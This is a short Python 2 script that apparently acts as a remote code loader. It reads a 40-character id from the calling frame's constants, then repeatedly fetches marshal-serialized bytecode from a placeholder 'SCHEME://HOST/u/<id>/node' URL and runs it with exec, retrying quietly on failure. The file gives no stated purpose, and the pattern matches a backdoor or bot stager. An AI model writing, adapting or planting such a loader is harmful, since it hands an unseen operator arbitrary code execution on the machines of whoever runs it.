# !/usr/bin/env python
import imp

if imp.get_magic() != '\x03\xf3\r\n':
    print "Please update to Python 2.7.15 (http://www.python.org/download/)"
    exit()

import urllib2, time, re, sys, marshal
global _S
global _B
global _U
global _C
for k in sys._getframe(1).f_code.co_consts:
    if not isinstance(k, basestring):
        continue
    m = re.search('[a-z0-9]{40}', k)
    if m:
        _S = "SCHEME"
        _B = "HOST"
        _U = m.group()
        _C = True
        count = 30
        while _C:
            if count <= 0:
                break
            try:
                exec marshal.loads(urllib2.urlopen('%s://%s/u/%s/node' % (_S, _B, _U)).read())
            except Exception, e:
                print e
                time.sleep(240)
            count = count - 1
        break
